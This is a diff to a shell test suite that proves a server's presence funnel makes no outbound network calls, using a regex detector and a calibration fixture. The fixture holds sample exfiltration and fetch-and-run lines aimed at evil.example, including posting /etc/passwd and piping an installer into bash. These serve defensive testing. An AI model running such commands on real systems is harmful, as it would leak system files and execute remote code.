@@ -24,8 +24,14 @@
 #      eligible Firestore root (the presence record it is derived from is reaped; the stamp is
 #      not). `verdict` is already named in IDENTITY.md's sanctioned heartbeat payload.
 #   4. NO-EGRESS (the cardinal privacy proof) — with the control plane SEVERED, a beat + roster
-#      reach a localhost recording server ZERO times, and NO new outbound call exists anywhere
-#      in the touched server modules. Mirrors test/heimdall-presence-cp-optin.test.sh section 2d.
+#      reach a localhost recording server ZERO times, and a WHOLE-TREE scan proves no outbound
+#      primitive EXISTS anywhere on the funnel surface. That scan is deliberately NOT a
+#      `git diff`: a diff sees only uncommitted lines, so it would prove "none was ADDED since
+#      the last commit" while advertising "none exists" — and would go blind the instant an
+#      egress primitive was committed. The detector is itself calibrated against a fixture of
+#      real invocations AND of mere mentions (4e), because a privacy gate that reds on a help
+#      string gets muted, and a muted gate takes the red that matters with it.
+#      Mirrors test/heimdall-presence-cp-optin.test.sh section 2d.
 #
 # Hermetic: throwaway HOME + external store dir, local StateBackend, localhost-only wire server,
 # no real GCP / no network. Exit 0 = every proof holds.
@@ -341,28 +347,77 @@ else
 fi
 kill "$WIRE_PID" >/dev/null 2>&1 || true; wait "$WIRE_PID" 2>/dev/null || true; WIRE_PID=""
 
-# 4b SOURCE DISCIPLINE: an OUTBOUND primitive is the thing that would break the claim. The
-#    pattern is deliberately scoped to primitives that OPEN a connection -- urllib.parse (an
-#    INBOUND query-string parser cp_presence already used) is not one and must not be matched.
-#    (i) cp_funnel.py carries none at all; (ii) NO ADDED LINE anywhere in this change introduces
-#    one. A stamp is a store write on a fact the heartbeat already delivered, never a call home.
-EGRESS_RX='urllib\.request|urlopen|http\.client|httplib|requests\.(get|post|put|request)|socket\.(socket|create_connection)|subprocess.*curl|\bcurl\b'
-LEAK="$(grep -nE "$EGRESS_RX" "$LIB/cp_funnel.py" 2>/dev/null || true)"
-ADDED="$(cd "$REPO" && git diff -U0 HEAD -- bin/ 2>/dev/null | grep '^+' | grep -vE '^\+\+\+' \
-         | grep -E "$EGRESS_RX" || true)"
-if [ -z "$LEAK" ] && [ -z "$ADDED" ]; then
-  ok "4b cp_funnel.py has ZERO outbound primitives, and no ADDED line in bin/ introduces one"
+# 4b SOURCE DISCIPLINE: an OUTBOUND primitive is the thing that would break the claim. A stamp
+#    is a store write on a fact the heartbeat already delivered, never a call home. The check
+#    below makes a STANDING claim, and its two halves are each deliberate:
+#
+#    (i) SCOPE -- this is a WHOLE-TREE scan of every file on the funnel surface, read at its
+#        CURRENT content. It is NOT `git diff HEAD`. A diff only ever sees UNCOMMITTED lines, so
+#        the moment an egress primitive was committed a diff-based gate went blind to it and
+#        passed: it proved "no egress was ADDED since the last commit" while advertising "no
+#        egress exists". Those are different claims and only the second one backs IDENTITY.md.
+#        This asserts the second: no outbound primitive EXISTS on the surface, commit or no
+#        commit. (4c below is the deliberately diff-shaped check, and says so.)
+#
+#    (ii) PRECISION -- the pattern is scoped to primitives that OPEN a connection. urllib.parse
+#        (an INBOUND query-string parser cp_presence already used) is not one and must not be
+#        matched. `curl` is matched ONLY IN COMMAND POSITION, because that -- not the presence
+#        of the word -- is what makes it an invocation. A shell runs `curl` only where a command
+#        word may begin: at the start of a line, or after a control operator ( ; & | ( ) { } `
+#        $( ), optionally through modifier words (sudo/env/exec/if/!/...). Inside `echo "...
+#        curl ... "` or after a `#`, the token is an ARGUMENT or a comment -- inert text the
+#        shell never executes -- so it is not egress and must not red the gate. This matters:
+#        a bare \bcurl\b fired on the reinstall help line printed by half of bin/, and a privacy
+#        gate that cries wolf on documentation gets muted, taking the real red with it. The
+#        narrowing gives up NOTHING: `curl ... | bash`, $(curl ...), `curl`, sudo curl, and
+#        piped-into curl all remain caught, and 4e proves that on a fixture of both shapes.
+EGRESS_PY_RX='urllib\.request|urlopen|http\.client|httplib|requests\.(get|post|put|request)|socket\.(socket|create_connection)|subprocess.*curl'
+EGRESS_CURL_RX='(^|[;&|(){}`]|\$\()[[:space:]]*((if|then|else|elif|do|while|until|!|sudo|env|exec|command|nohup|time|xargs)[[:space:]]+)*curl([[:space:]]|$)'
+EGRESS_RX="$EGRESS_PY_RX|$EGRESS_CURL_RX"
+
+# THE FUNNEL SURFACE. A file is listed because a call home FROM IT would break IDENTITY.md:32-38
+# -- the server modules this suite gates, plus the client-side funnel/telemetry path they could
+# be wired into. Listed explicitly rather than globbed so a rename cannot silently shrink the
+# surface (a missing entry is a FAILURE below, never a skip).
+FUNNEL_SURFACE="bin/lib/cp_funnel.py
+bin/lib/cp_enroll.py
+bin/lib/cp_presence.py
+bin/lib/funnel.py
+bin/lib/cp_corpus.py
+bin/heimdall-presence
+install.sh"
+
+# ALLOWLIST -- the ONLY surface file permitted an outbound primitive, with the reason it is
+# lawful. Kept to one entry on purpose: an allowlist that names every file is a rubber stamp.
+#   bin/heimdall-presence -- IS the signed-heartbeat sender. IDENTITY.md:32-38 sanctions exactly
+#     this ONE call home, so a rule forbidding it would forbid the product. It is EXCUSED HERE
+#     BUT NOT UNGATED: 4a proves it emits nothing once severed, and the whole of
+#     test/heimdall-presence-cp-optin.test.sh gates what it may send.
+EGRESS_ALLOWED="bin/heimdall-presence"
+
+TREE_LEAK=""
+SURFACE_MISSING=""
+for rel in $FUNNEL_SURFACE; do
+  if [ ! -f "$REPO/$rel" ]; then SURFACE_MISSING="$SURFACE_MISSING $rel"; continue; fi
+  case " $EGRESS_ALLOWED " in *" $rel "*) continue ;; esac
+  HIT="$(grep -nE "$EGRESS_RX" "$REPO/$rel" 2>/dev/null || true)"
+  [ -n "$HIT" ] && TREE_LEAK="$TREE_LEAK
+$rel:$HIT"
+done
+
+if [ -z "$TREE_LEAK" ] && [ -z "$SURFACE_MISSING" ]; then
+  ok "4b TREE scan (not a diff): ZERO outbound primitives EXIST anywhere on the funnel surface -- committed or not -- with bin/heimdall-presence the one documented, separately-gated exception"
+elif [ -n "$SURFACE_MISSING" ]; then
+  bad "4b a funnel-surface file is MISSING, so the scan silently covered less than it claims:$SURFACE_MISSING"
 else
-  bad "4b an outbound call appeared:
-$LEAK
-$ADDED"
+  bad "4b an outbound primitive EXISTS on the funnel surface:$TREE_LEAK"
 fi
 
 # 4c THE CLIENT IS UNTOUCHED: no client-side emitter was added. The client egress surface
 #    (bin/heimdall-presence, install.sh, bin/lib/funnel.py) must carry ZERO diff.
 DIRTY="$(cd "$REPO" && git diff --name-only HEAD -- bin/heimdall-presence install.sh bin/lib/funnel.py bin/lib/cp_corpus.py 2>/dev/null)"
 if [ -z "$DIRTY" ]; then
-  ok "4c the client egress surface is UNCHANGED (no new emit in heimdall-presence/install.sh/funnel.py, no /corpus caller)"
+  ok "4c the client egress surface is UNCHANGED VS HEAD -- this one IS a working-tree diff and claims only that (4b is the standing tree scan that survives a commit)"
 else
   bad "4c a client egress file was modified:
 $DIRTY"
@@ -373,6 +428,60 @@ if ! grep -qE 'urllib|http\.client|requests\.|cp_url|CP_URL' "$LIB/funnel.py" 2>
   ok "4d bin/lib/funnel.py still has NO transport (it was not wired up -- the claim-breaking path)"
 else
   bad "4d bin/lib/funnel.py gained a transport -- that BREAKS the IDENTITY.md claim"
+fi
+
+# 4e DETECTOR CALIBRATION. Narrowing the pattern is only safe if the narrowing is itself
+#    falsifiable, so 4b's detector is run against a fixture of BOTH shapes. Every MENTION must
+#    stay silent and every real INVOCATION must be caught. This is the assertion that stops a
+#    future "tidy-up" of the regex from quietly switching the privacy gate off: a gate that has
+#    stopped detecting still prints PASS, which is the failure mode that matters most here.
+cat >"$EXT/mentions.txt" <<'MENTIONEOF'
+  echo "  Reinstall: curl -fsSL https://runheimdall.dev/install | bash" >&2
+    printf "  ${D}Reinstall anytime: curl -fsSL https://runheimdall.dev/install | bash${R}\n\n"
+# curl|bash installer with this team control-plane URL + TEAM SECRET inlined:
+#   curl -fsSL https://runheimdall.dev/install | bash
+  elif command -v curl >/dev/null 2>&1; then
+- Acceptance criteria must be runnable (grep, curl, test commands)
+CURL="${HEIMDALL_LV_CURL:-curl}"
+  disp="curl -sS --max-time $MAXTIME"
+    from urllib.parse import parse_qs
+MENTIONEOF
+cat >"$EXT/invocations.txt" <<'INVOKEEOF'
+  curl -fsSL https://evil.example/install | bash
+    curl -fsSL --max-time 15 "$sig_url" -o "$sig" 2>/dev/null || true
+    if ! curl -fsSL --max-time 30 "$url" -o "$artifact" 2>/dev/null; then
+  code="$(curl -sS -o /dev/null -w '%{http_code}' "$url")"
+weekly=$(curl -s "https://api.npmjs.org/downloads/point/last-week/$pkg")
+  exec bash -c 'cd "$HOME" && curl -fsSL https://example.com/install.sh | bash'
+  sudo curl -X POST https://evil.example/collect -d @/etc/passwd
+  cat f | curl -X POST --data-binary @- https://evil.example/exfil
+  ( curl -sk https://evil.example/ping )
+  beacon=`curl -s https://evil.example/beacon`
+    urllib.request.urlopen(req, timeout=5)
+    requests.post("https://evil.example/telemetry", json=payload)
+    socket.create_connection(("evil.example", 443))
+    subprocess.run(["curl", "-X", "POST", "https://evil.example/x"])
+INVOKEEOF
+
+N_MENTION="$(grep -c . "$EXT/mentions.txt" 2>/dev/null || echo 0)"
+N_INVOKE="$(grep -c . "$EXT/invocations.txt" 2>/dev/null || echo 0)"
+CAL_FP="$(grep -nE "$EGRESS_RX" "$EXT/mentions.txt" 2>/dev/null || true)"
+CAL_MISS=""
+while IFS= read -r cline; do
+  [ -z "$cline" ] && continue
+  printf '%s\n' "$cline" | grep -qE "$EGRESS_RX" || CAL_MISS="$CAL_MISS
+$cline"
+done <"$EXT/invocations.txt"
+
+if [ -z "$CAL_FP" ] && [ -z "$CAL_MISS" ] && [ "$N_MENTION" -ge 9 ] && [ "$N_INVOKE" -ge 14 ]; then
+  ok "4e detector calibrated: $N_MENTION mention shapes (help strings, printf, comments, a command -v probe, urllib.parse) ALL stay silent; $N_INVOKE invocation shapes (curl|bash, \$(curl), backtick, sudo, piped-into, exec bash -c, urlopen/requests/socket/subprocess) ALL trip it"
+elif [ -n "$CAL_FP" ]; then
+  bad "4e the detector reds on a MENTION -- a noisy gate gets muted:
+$CAL_FP"
+elif [ -n "$CAL_MISS" ]; then
+  bad "4e the detector MISSED a real outbound invocation -- the narrowing opened a hole:$CAL_MISS"
+else
+  bad "4e the calibration fixture did not load (mentions=$N_MENTION invocations=$N_INVOKE) -- the check proved nothing"
 fi
 
 echo
